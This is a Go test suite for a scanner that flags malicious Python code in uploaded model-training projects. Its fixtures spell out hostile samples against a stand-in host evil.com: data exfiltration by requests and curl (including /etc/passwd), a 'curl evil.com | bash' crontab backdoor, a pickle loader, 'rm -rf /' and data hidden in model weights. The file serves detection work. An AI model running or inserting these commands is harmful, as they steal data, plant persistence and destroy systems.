package codeaudit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writeTestFile creates a file under dir with the given content.
func writeTestFile(t *testing.T, dir, name, content string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}

// ── Malicious code detection tests ───────────────────────

func TestScannerDetectsNetworkRequests(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import requests
def exfiltrate(data):
    requests.post("http://evil.com/steal", json=data)
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Passed {
		t.Fatal("expected scan to FAIL for network request code")
	}
	if report.HighCount == 0 {
		t.Fatal("expected HIGH findings for requests.post")
	}
	assertFindingHasRule(t, report, "NET_001")
}

func TestScannerDetectsSocket(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "model.py", `
import socket
def send_data(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 443))
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Passed {
		t.Fatal("expected scan to FAIL for socket code")
	}
	assertFindingHasRule(t, report, "NET_002")
}

func TestScannerDetectsSubprocess(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "hook.py", `
import subprocess
def run():
    subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Passed {
		t.Fatal("expected scan to FAIL for subprocess code")
	}
	assertFindingHasRule(t, report, "CMD_001")
}

func TestScannerDetectsObfuscation(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "loader.py", `
import base64, pickle
def load():
    payload = base64.b64decode("ZXYg...")
    code = pickle.loads(payload)
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Passed {
		t.Fatal("expected scan to FAIL for obfuscation code")
	}
	assertFindingHasRule(t, report, "OBF_001")
}

func TestScannerDetectsPersistence(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "backdoor.py", `
import os
def persist():
    # write to crontab for persistence
    crontab_entry = "* * * * * curl evil.com | bash"
    os.popen("echo '" + crontab_entry + "' | crontab -")
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Passed {
		t.Fatal("expected scan to FAIL for persistence code")
	}
	assertFindingHasRule(t, report, "PER_001")
}

// ── Benign code should pass ──────────────────────────────

func TestScannerPassesBenignTrainingCode(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import torch
import torch.nn as nn
from torch.utils.data import DataLoader

class SimpleModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 2)
    def forward(self, x):
        return self.fc(x)

def train(model, loader, epochs=10):
    criterion = nn.CrossEntropyLoss()
    optimizer = torch.optim.Adam(model.parameters(), lr=0.001)
    for epoch in range(epochs):
        for batch in loader:
            optimizer.zero_grad()
            output = model(batch)
            loss = criterion(output, batch)
            loss.backward()
            optimizer.step()
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatalf("expected scan to PASS for benign training code, got %d HIGH findings", report.HighCount)
	}
}

func TestScannerSkipsComments(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "commented.py", `
# import requests  -- this is just a comment
# subprocess.run(["echo", "hello"])
def safe_function():
    return 42
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatal("expected scan to PASS when malicious patterns are only in comments")
	}
}

func TestScannerSkipsPycache(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "__pycache__/cached.py", `
import requests
requests.post("http://evil.com")
`)
	writeTestFile(t, dir, "train.py", `
import torch
model = torch.nn.Linear(10, 2)
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatal("expected scan to PASS when __pycache__ is skipped")
	}
	if report.FilesCount != 1 {
		t.Fatalf("expected 1 file scanned, got %d", report.FilesCount)
	}
}

// ── MEDIUM findings should not block ─────────────────────

func TestScannerMediumFindingsDoNotBlock(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "config.py", `
import os
api_key = os.getenv("API_KEY")
debug = eval("True")
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatal("expected scan to PASS with only MEDIUM findings")
	}
	if report.MediumCount == 0 {
		t.Fatal("expected MEDIUM findings for os.getenv and eval")
	}
}

// ── Report structure ─────────────────────────────────────

func TestReportStructure(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "malicious.py", `
import requests
import subprocess
requests.get("http://evil.com")
subprocess.run(["rm", "-rf", "/"])
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}

	if report.ScanTime == "" {
		t.Fatal("ScanTime should not be empty")
	}
	if report.ScannedDir != dir {
		t.Fatalf("ScannedDir = %s, want %s", report.ScannedDir, dir)
	}
	if report.FilesCount != 1 {
		t.Fatalf("FilesCount = %d, want 1", report.FilesCount)
	}
	if len(report.Findings) == 0 {
		t.Fatal("expected findings > 0")
	}
	for _, f := range report.Findings {
		if f.File == "" || f.Line == 0 || f.RuleID == "" || f.CodeSnippet == "" {
			t.Fatalf("finding has empty required field: %+v", f)
		}
	}
}

// ── Empty directory ──────────────────────────────────────

func TestScannerEmptyDirectory(t *testing.T) {
	dir := t.TempDir()
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatal("expected scan to PASS for empty directory")
	}
	if len(report.Findings) != 0 {
		t.Fatalf("expected 0 findings, got %d", len(report.Findings))
	}
}

// ── Non-existent directory ───────────────────────────────

func TestScannerNonExistentDirectory(t *testing.T) {
	scanner := NewDefaultScanner()
	_, err := scanner.ScanDirectory("/nonexistent/path/xyz")
	if err == nil {
		t.Fatal("expected error for non-existent directory")
	}
}

// ── Scan real model code ─────────────────────────────────

func TestScannerOnTEEtestModel(t *testing.T) {
	// Scan the actual TEE-test model code if available.
	modelDir := filepath.Join("..", "..", "models", "examples", "TEE-test", "TEE-test", "examples")
	if _, err := os.Stat(modelDir); os.IsNotExist(err) {
		t.Skip("TEE-test model not available, skipping")
	}
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(modelDir)
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("TEE-test scan: %d files, %d findings (%d HIGH, %d MEDIUM), passed=%v",
		report.FilesCount, len(report.Findings), report.HighCount, report.MediumCount, report.Passed)

	// TEE-test code should pass — it's a legitimate training example.
	if !report.Passed {
		for _, f := range report.Findings {
			if f.Severity == SeverityHigh {
				t.Logf("  HIGH: %s:%d [%s] %s", filepath.Base(f.File), f.Line, f.RuleID, f.CodeSnippet)
			}
		}
		t.Fatal("TEE-test model code should pass security scan")
	}
}

func TestScannerOnRetinaDKDFiles(t *testing.T) {
	dir := filepath.Join("..", "..", "models", "examples", "Retina-DKD")
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		t.Skip("Retina-DKD files not available, skipping")
	}
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.HighCount != 0 {
		t.Errorf("expected 0 HIGH findings, got %d", report.HighCount)
	}
	if report.MediumCount == 0 {
		t.Errorf("expected Medium warning findings retained for Retina-DKD, got 0")
	}
	if !report.Passed {
		t.Errorf("expected Retina-DKD scan to pass with Medium warnings, got passed=false")
	}
}

// ── Context extraction tests ─────────────────────────────

func TestScannerCapturesContext(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "ctx.py", `
import requests

def send_metrics():
    metrics = {"acc": 0.98}
    endpoint = "http://example.com/metrics"
    requests.post(endpoint, json=metrics)
    return True
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) == 0 {
		t.Fatal("expected at least one finding")
	}
	f := report.Findings[0]
	if !strings.Contains(f.ContextBefore, "endpoint") {
		t.Fatalf("expected ContextBefore to include nearby code, got: %q", f.ContextBefore)
	}
	if !strings.Contains(f.ContextAfter, "return True") {
		t.Fatalf("expected ContextAfter to include nearby code, got: %q", f.ContextAfter)
	}
}

// ── Data embedding detection tests ───────────────────────

func TestScannerDetectsDataEmbeddingInOutput(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import numpy as np
import shutil
def train():
    data = np.load("data/train_images.npy")
    # Maliciously embed raw data in output
    np.save("output/embedded_data.npy", data)
    shutil.copytree("data/train_images", "output/raw_copy")
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Passed {
		t.Fatal("expected scan to FAIL for data embedding code")
	}
	assertFindingHasRule(t, report, "EMB_001")
}

func TestScannerDetectsDataCopyToOutput(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "exfil.py", `
import shutil
def smuggle():
    # Copy files to the export/output directory
    shutil.copy("/tmp/extracted/config.json", "/output/config.json")
    shutil.move("/tmp/stolen.bin", "/result/stolen.bin")
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Passed {
		t.Fatal("expected scan to FAIL for data copy to output")
	}
	assertFindingHasRule(t, report, "EMB_002")
}

func TestScannerDetectsSteganographicEmbedding(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "hide.py", `
import torch, base64
def hide_data_in_weights(model, data):
    # Encode data into model state dict
    encoded = base64.b64encode(data)
    state_dict = model.state_dict()
    state_dict['hidden_data'] = encoded
    torch.save(state_dict, "output/model.pth")
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Passed {
		t.Fatal("expected scan to FAIL for steganographic embedding")
	}
	assertFindingHasRule(t, report, "EMB_004")
}

func TestScannerBenignSavePasses(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import torch
def train(model, optimizer, epochs):
    for epoch in range(epochs):
        loss = train_step(model)
        # Saving model weights is normal
        torch.save(model.state_dict(), "output/model.pth")
        # Saving metrics is normal
        torch.save({"epoch": epoch, "loss": loss}, "output/checkpoint.pth")
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		for _, f := range report.Findings {
			if f.Severity == SeverityHigh {
				t.Logf("  unexpected HIGH: [%s] %s", f.RuleID, f.CodeSnippet)
			}
		}
		t.Fatal("benign model saving should pass security scan")
	}
}

func TestScannerIgnoresDatasetLengthLogging(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import torch
def train(test_dataset):
    print(len(test_dataset))
    return torch.tensor(1)
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatalf("expected benign dataset length logging to pass, got findings: %+v", report.Findings)
	}
}

func TestScannerIgnoresCheckpointSaveWithDatasetPath(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import torch

def train(model, model_name, dataset, test_dataset):
    print(len(test_dataset))
    torch.save(model.state_dict(), 'model/model_' + model_name + '_' + dataset + '/model_1.pth')
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatalf("expected benign checkpoint save to pass, got findings: %+v", report.Findings)
	}
}

func TestScannerDetectsDatasetPrintingAsMedium(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "eval.py", `
def evaluate(dataset, model_name):
    print(model_name + ':')
    print(dataset + '--------')
    print(dataset)
    print("ave_acc: %.2f%%" % 85.5)
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 2 {
		t.Fatalf("expected 2 Medium findings for dataset printing, got: %d (%+v)", len(report.Findings), report.Findings)
	}
	if !report.Passed {
		t.Fatalf("Medium findings should not block import")
	}
	for _, f := range report.Findings {
		if f.Severity != SeverityMedium || f.RuleID != "EMB_003" {
			t.Errorf("expected EMB_003 MEDIUM, got %s %s", f.RuleID, f.Severity)
		}
	}
}

func TestScannerDetectsRawDataLogging(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "leak.py", `
def leak(raw_data, images, samples, batch, x_train):
    print(raw_data)
    print(images)
    print(samples)
    print(batch)
    print(x_train)
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(report.Findings) != 5 {
		t.Fatalf("expected 5 EMB_003 findings for raw data logging, got %d: %+v", len(report.Findings), report.Findings)
	}
	for _, f := range report.Findings {
		if f.RuleID != "EMB_003" {
			t.Errorf("expected rule EMB_003, got %s", f.RuleID)
		}
	}
}

func TestScannerIgnoresSafeSubprocessRun(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "runner.py", `
import subprocess
import sys

def run_py(python_name, dataset, model_name, xlsx_name, dataset_num, model_name_save, basic_model, gpu, wam,
           windows_num, el, er, layer_num):
    cmd = [sys.executable, python_name, '-s', dataset, '-m', model_name, '-x', xlsx_name, '-d', str(dataset_num),
           '-mnp', model_name_save, '-b', basic_model, '-g', str(gpu), '-w', wam, '-n', str(windows_num),
           '-el', str(el), '-er', str(er), '-l', str(layer_num)]
    subprocess.run(cmd, check=True)
`)
	scanner := NewDefaultScanner()
	report, err := scanner.ScanDirectory(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Passed {
		t.Fatalf("expected safe subprocess usage to pass, got findings: %+v", report.Findings)
	}
}

// ── helpers ──────────────────────────────────────────────

func assertFindingHasRule(t *testing.T, report *Report, ruleID string) {
	t.Helper()
	for _, f := range report.Findings {
		if f.RuleID == ruleID {
			return
		}
	}
	var ids []string
	for _, f := range report.Findings {
		ids = append(ids, f.RuleID)
	}
	t.Fatalf("expected finding with rule %s, got: %s", ruleID, strings.Join(ids, ", "))
}
